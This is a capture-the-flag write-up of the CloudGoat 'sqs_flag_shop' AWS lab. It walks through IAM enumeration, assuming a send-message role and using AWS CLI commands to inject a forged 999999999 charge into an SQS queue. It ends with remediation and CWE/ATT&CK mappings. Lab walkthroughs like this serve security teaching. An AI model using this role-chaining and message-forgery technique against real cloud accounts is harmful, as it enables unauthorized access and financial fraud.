@@ -1,0 +1,389 @@
+# 🥷 CloudGoat: SQS Flag Shop
+
+_Write-up: Buying an unaffordable flag by injecting an arbitrary charge straight into the SQS queue, bypassing the web app that owns the price_
+
+## 🧭 Overview
+
+**Scenario:** `sqs_flag_shop` \
+**Platform:** [CloudGoat (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/cloudgoat) \
+**Tools:** AWS CLI + a browser \
+**Objective:** Starting as the low-privileged `sqs` user, top up an in-app cash balance far beyond what the store lets you buy, then spend it on a flag priced out of reach — by assuming a role that lets you write to the queue the backend trusts.
+
+## ⚔️ Attack Path Summary
+
+`sqs-user` (`iam:Get*`/`List*` + `sts:AssumeRole` on one role) → Assume `send-message` role (`sqs:GetQueueUrl` + `sqs:SendMessage`) → Send a crafted `{"charge_amount": 999999999}` straight to the queue → Backend credits the balance → Buy the flag
+
+The pivot is **trust-boundary confusion**. The web app validates the purchase amount, but the *consumer* behind the queue doesn't re-check it — and we have a role that writes to the queue directly, skipping the app entirely.
+
+## 🔑 Phase 1: Initial Access
+
+The scenario hands you one access key pair for the `sqs` user and the URL of a small web store.
+
+```
+cloudgoat_output_sqsuser_access_key_id = AKIA****************
+cloudgoat_output_sqsuser_secret_key    = 62Ld2F0DL67PXEx2V8O9pkh7xAOkm3uBa/******
+web_site_ip = http://<web-app-ip>:5000
+```
+
+#### Configure Profile
+
+```bash
+aws configure --profile flag_shop
+# Access Key: AKIA****************
+# Secret Key: 62Ld2F0DL67PXEx2V8O9pkh7xAOkm3uBa/******
+```
+
+#### Validate Credentials
+
+```bash
+aws sts get-caller-identity --profile flag_shop
+```
+
+```json
+{
+  "UserId": "AIDA****************",
+  "Account": "7912********",
+  "Arn": "arn:aws:iam::7912********:user/cg-sqs-user-cgid4pjv8ppn6n"
+}
+```
+
+We land as the `sqs` user. Two things to map: what the web app does with our money, and what this identity can reach in the account.
+
+## 🛒 Phase 2: Read the Store
+
+The store sells flags for more cash than you start with, and lets you top up your balance in fixed increments. The interesting route is the one that charges cash:
+
+```python
+@app.route('/charge_cash/<cash>', methods=['POST'])
+def charge_cash(cash):
+    cash = int(cash)
+    if cash == 1 or cash == 5 or cash == 10:
+        msg = {"charge_amount": cash}
+        message_body = json.dumps(msg)
+        response = sqs.sqs_client.send_message(
+          QueueUrl=sqs.sqs_queue_url,
+          MessageBody=message_body
+        )
+        time.sleep(10)
+        return redirect(url_for('index'))
+    else:
+        return "BAD Request!!"
+```
+
+#### Key Finding
+
+The web app enforces the price — it only accepts `1`, `5`, or `10` — and then drops a message onto an **SQS queue** for a backend worker to process:
+
+```json
+{ "charge_amount": 10 }
+```
+
+The validation is real **server-side** validation — Flask enforces `cash == 1 or 5 or 10`, not the browser. But it's enforced at *one producer*. The queue message format is trivial and fully attacker-known, so if we can put our own message on that queue, the check never runs — it belongs to a code path we've stepped around entirely. The only question left is whether this identity can write to the queue.
+
+## 👥 Phase 3: Enumerate the SQS User
+
+```bash
+aws iam list-users --profile flag_shop \
+  | jq -r '.Users[].UserName | select(contains("cg-"))'
+```
+
+```
+cg-sqs-user-cgid4pjv8ppn6n
+cg-web-sqs-manager-cgid4pjv8ppn6n
+```
+
+No **managed** policies are attached to our user:
+
+```bash
+aws iam list-attached-user-policies --user-name cg-sqs-user-cgid4pjv8ppn6n --profile flag_shop
+# → { "AttachedPolicies": [] }
+```
+
+But there's an **inline** policy — easy to miss if you only check attached ones:
+
+```bash
+aws iam list-user-policies --user-name cg-sqs-user-cgid4pjv8ppn6n --profile flag_shop
+# → cg-sqs-scenario-assumed-role
+```
+
+```bash
+aws iam get-user-policy \
+  --user-name cg-sqs-user-cgid4pjv8ppn6n \
+  --policy-name cg-sqs-scenario-assumed-role --profile flag_shop
+```
+
+```json
+{
+  "PolicyDocument": {
+    "Statement": [
+      {
+        "Effect": "Allow",
+        "Action": ["iam:Get*", "iam:List*"],
+        "Resource": "*"
+      },
+      {
+        "Effect": "Allow",
+        "Action": "sts:AssumeRole",
+        "Resource": "arn:aws:iam::7912********:role/cg-sqs-send-message-cgid4pjv8ppn6n"
+      }
+    ]
+  }
+}
+```
+
+#### Key Finding
+
+Broad IAM **read**, plus `sts:AssumeRole` scoped to exactly one role: `cg-sqs-send-message`. The name is a spoiler — that role almost certainly holds the write access to the queue that our user is missing.
+
+## 🧩 Phase 4: Inventory the Roles
+
+```bash
+aws iam list-roles --profile flag_shop \
+  | jq -r '.Roles[].RoleName | select(contains("cg-"))'
+```
+
+```
+cg-sqs-lambda-cgid4pjv8ppn6n
+cg-sqs-send-message-cgid4pjv8ppn6n
+```
+
+#### The `lambda` role — the backend worker
+
+```bash
+aws iam list-attached-role-policies --role-name cg-sqs-lambda-cgid4pjv8ppn6n --profile flag_shop
+```
+
+```json
+{
+  "AttachedPolicies": [
+    { "PolicyName": "AWSLambdaSQSQueueExecutionRole" },
+    { "PolicyName": "AWSLambdaVPCAccessExecutionRole" }
+  ]
+}
+```
+
+This is consistent with a **Lambda consuming the queue** and applying each `charge_amount` to a balance — the `AWSLambdaSQSQueueExecutionRole` policy is what an SQS-triggered function needs. The role policy alone doesn't *prove* the event-source mapping, but it points squarely at the Lambda as the consumer: the component that trusts whatever the web app — or we — put on the queue.
+
+#### The `send-message` role — our way in
+
+```bash
+aws iam list-role-policies --role-name cg-sqs-send-message-cgid4pjv8ppn6n --profile flag_shop
+# → cg-sqs
+
+aws iam get-role-policy \
+  --role-name cg-sqs-send-message-cgid4pjv8ppn6n \
+  --policy-name cg-sqs --profile flag_shop
+```
+
+```json
+{
+  "PolicyDocument": {
+    "Statement": [
+      {
+        "Effect": "Allow",
+        "Action": ["sqs:GetQueueUrl", "sqs:SendMessage"],
+        "Resource": "arn:aws:sqs:us-east-1:7912********:cash_charging_queue"
+      }
+    ]
+  }
+}
+```
+
+#### Key Finding
+
+The `send-message` role can `SendMessage` to `cash_charging_queue` — the very queue the Flask app writes to and the Lambda reads from. Our user can assume this role. That's the whole exploit: we can publish to the queue as a first-class producer, and the backend can't tell our message from the app's.
+
+The dangerous thing isn't `sqs:SendMessage` in isolation — it's the **authorization path** that connects an interactive, human-held identity to it:
+
+```
+human-held access key
+      │  sts:AssumeRole
+      ▼
+cg-sqs-send-message role
+      │  sqs:SendMessage
+      ▼
+cash_charging_queue  →  drives the account balance
+```
+
+An interactive principal one `AssumeRole` hop away from a queue that can trigger a balance mutation is the vulnerability. Least privilege on that single edge would have closed the entire chain.
+
+## 🔗 Phase 5: The Attack Path
+
+Each grant is reasonable on its own; chained, they let us print money:
+
+1. **The web app owns the price check** — `charge_amount` is validated to `1/5/10` only inside the Flask route, one of *two* producers.
+2. **The consumer is the trust boundary, and it doesn't validate** — the Lambda credits whatever `charge_amount` it reads. The queue itself is just untrusted transport carrying our data to it.
+3. **Our user can assume `send-message`**, which can write to that queue directly.
+4. So: assume `send-message` → send `{"charge_amount": <huge>}` → the Lambda credits it → buy the flag.
+
+The flaw is enforcing the integrity check at *one producer* (the web app) while a *second, independently reachable producer* (any holder of the `send-message` role) can write to the same queue. Server-side validation on one producer provides no protection against another when the security-sensitive decision — crediting the balance — happens in a consumer that trusts the message contents without independently validating them.
+
+> **SQS is transport, not a trust boundary. The Lambda is where the money decision is made, so the Lambda is what must validate. If two producers can write and only one validates, the consumer's trust is misplaced.**
+
+## 🎭 Phase 6: Assume the Send-Message Role
+
+```bash
+aws sts assume-role \
+  --role-arn arn:aws:iam::7912********:role/cg-sqs-send-message-cgid4pjv8ppn6n \
+  --role-session-name sqs-session \
+  --profile flag_shop
+```
+
+```json
+{
+  "Credentials": {
+    "AccessKeyId": "ASIA****************",
+    "SecretAccessKey": "PKok59ej6mUOdQU/3z3SG/APjZbSmF02ude******",
+    "SessionToken": "FwoGZXIvYXdzEH0aDKIF+1RTm1Yb6IUqCiKvAbveJHaMiP...******",
+    "Expiration": "2026-08-16T20:06:43+00:00"
+  },
+  "AssumedRoleUser": {
+    "Arn": "arn:aws:sts::7912********:assumed-role/cg-sqs-send-message-cgid4pjv8ppn6n/sqs-session"
+  }
+}
+```
+
+Drop those temporary credentials into a named profile (`sqs_messenger`).
+
+## 🎯 Phase 7: Get the Queue URL, then Inject
+
+`SendMessage` needs a queue *URL*, not the ARN — and the role conveniently carries `GetQueueUrl` too:
+
+```bash
+aws sqs get-queue-url \
+  --queue-name cash_charging_queue \
+  --profile sqs_messenger --region us-east-1
+```
+
+```json
+{
+  "QueueUrl": "https://sqs.us-east-1.amazonaws.com/7912********/cash_charging_queue"
+}
+```
+
+Now send a message in the exact shape the Lambda expects — but with a `charge_amount` the web app would have rejected outright:
+
+```bash
+aws sqs send-message \
+  --queue-url https://sqs.us-east-1.amazonaws.com/7912********/cash_charging_queue \
+  --message-body '{"charge_amount": 999999999}' \
+  --profile sqs_messenger --region us-east-1
+```
+
+```json
+{
+  "MD5OfMessageBody": "dd6cc8cded282256c9e21cba3b4bf570",
+  "MessageId": "f8e477ed-9ff4-4ad8-a255-ede521431b4f"
+}
+```
+
+The Lambda picks the message up, reads `charge_amount`, and credits `999999999` to the balance — no `1/5/10` gate on this path, because that gate only ever existed in the Flask route we bypassed.
+
+## 🚩 Phase 8: Buy the Flag
+
+Refresh the store. The balance is now absurd — enough to afford the flag that was priced out of reach. Buy it, and the `/receipt` page hands over the prize:
+
+```
+Bought the item!
+FLAG{sqs-shop-super-secret-item}
+```
+
+We created a balance that the store's legitimate top-up path could never have produced — and spent it.
+
+## 📐 Attack Chain Diagram
+
+```
+┌────────────────────────────────────┐
+│  cg-sqs-user                       │
+│  iam:Get*/List* + sts:AssumeRole   │
+└───────────────┬────────────────────┘
+                │ sts:AssumeRole (one role only)
+                ▼
+┌────────────────────────────────────┐
+│  cg-sqs-send-message role          │
+│  sqs:GetQueueUrl + sqs:SendMessage ★│
+└───────────────┬────────────────────┘
+                │ send-message {"charge_amount": 999999999}
+                ▼
+┌────────────────────────────────────┐
+│  cash_charging_queue               │
+│  (validated only by the web app)   │
+└───────────────┬────────────────────┘
+                │ consumed by
+                ▼
+┌────────────────────────────────────┐
+│  cg-sqs-lambda worker              │
+│  credits charge_amount, no re-check │
+└───────────────┬────────────────────┘
+                │ balance → buy
+                ▼
+┌────────────────────────────────────┐
+│  FLAG{sqs-shop-super-secret-item}  │
+└────────────────────────────────────┘
+```
+
+## 🚨 Weaknesses Demonstrated
+
+Potential CWE mappings — these describe *different aspects* of the chain, which is really *broken authorization path + insufficient validation of an asynchronous message*. No single CWE captures it cleanly:
+
+| # | Weakness | CWE |
+|---|----------|-----|
+| 1 | Consumer trusts attacker-controlled message data across a security boundary, with no re-validation | CWE-501 (Trust Boundary Violation) |
+| 2 | Lambda fails to constrain `charge_amount` from the message | CWE-20 (Improper Input Validation) |
+| 3 | Critical queue is writable through an unintended IAM authorization path | CWE-732 (Incorrect Permission Assignment) |
+
+## 💡 Remediation
+
+1. **Validate at the consumer, where the decision is made.** The Lambda should reject anything where `charge_amount` is not exactly one of the permitted values **before performing any state-changing operation**. A check that lives only at one producer is advisory — treat every queue message as attacker-controlled input regardless of who is *expected* to publish it.
+2. **Authorize the producer via IAM, not an application secret.** If only the web app should generate credit events, restrict `sqs:SendMessage` on that queue to the app's own execution identity, and remove every other path to it. Reach for signed message metadata/HMAC only if you genuinely have *multiple* legitimate producers to distinguish — don't bolt on an application-managed secret to paper over an overly broad IAM trust path AWS identity can already close.
+3. **Don't let a low-priv user reach a queue that drives the balance.** `sts:AssumeRole` into `send-message` is the pivot. Remove the assume-role grant, or scope the producer role to a component that has no other purpose and no path back to an interactive principal.
+4. **Separate the app's writer identity from anything assumable.** The web app can hold `SendMessage` directly through its own execution role — there's no reason a human-held access key should be one hop from the same permission.
+5. **Put an invariant at the state-changing operation itself.** The balance update should reject impossible values (bounds, rate limits) *even if* an attacker reaches the queue — the money mutation must not assume the queue is pristine. Then alert on `charge_amount` values or `SendMessage` calls that don't originate from the web app's role.
+
+## 🎯 MITRE ATT&CK Mapping
+
+Relevant techniques — the role assumption is AWS's intended mechanism, so read these as *what the activity resembles*, not a precise classification. I've kept only the two with a strong justification rather than padding the table:
+
+| Tactic | Technique | ID |
+|--------|-----------|-----|
+| Discovery | Cloud Infrastructure Discovery | T1580 |
+| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 |
+
+## 🛠️ Commands Reference
+
+```bash
+# Recon
+aws sts get-caller-identity --profile flag_shop
+aws iam list-users --profile flag_shop
+aws iam list-user-policies --user-name <sqs-user> --profile flag_shop
+aws iam get-user-policy --user-name <sqs-user> --policy-name <inline-policy> --profile flag_shop
+aws iam list-roles --profile flag_shop
+aws iam get-role-policy --role-name <send-message-role> --policy-name cg-sqs --profile flag_shop
+
+# Assume the send-message role
+aws sts assume-role \
+  --role-arn <send-message-role-arn> \
+  --role-session-name sqs-session --profile flag_shop
+
+# Inject the charge
+aws sqs get-queue-url --queue-name cash_charging_queue \
+  --profile sqs_messenger --region us-east-1
+aws sqs send-message \
+  --queue-url <queue-url> \
+  --message-body '{"charge_amount": 999999999}' \
+  --profile sqs_messenger --region us-east-1
+```
+
+## 📚 Additional Resources
+
+- [Amazon SQS: security best practices](https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-security-best-practices.html)
+- [Lambda with SQS as an event source](https://docs.aws.amazon.com/lambda/latest/dg/with-sqs.html)
+- [OWASP: Improper Data Validation](https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation)
+- [CloudGoat sqs_flag_shop scenario](https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/sqs_flag_shop)
+
+## 🎓 Key Takeaways
+
+1. **Validation belongs at the consumer, not the transport.** SQS just carries bytes; the Lambda is where the balance decision is made, so the Lambda is what must re-validate. The web app's `1/5/10` check does not protect the balance mutation once a second producer can write to the same queue.
+2. **Never confuse "only our app normally produces this message" with "this message is trustworthy."** Expected provenance is not authentication. `{"charge_amount": N}` was trivial to reconstruct — a message format the attacker knows is a message the attacker can forge — and the only thing standing between us and forging it was write access to the queue.
+3. **Follow the inline policies.** The `sts:AssumeRole` grant that unlocked everything lived in an *inline* user policy, invisible to `list-attached-user-policies`. Always check both.
+4. **The pivot was an authorization path, not an exploit.** No code execution, no injection — just an over-scoped assume-role edge from a human identity to a money-moving queue. Least privilege on that one edge would have closed the whole chain.
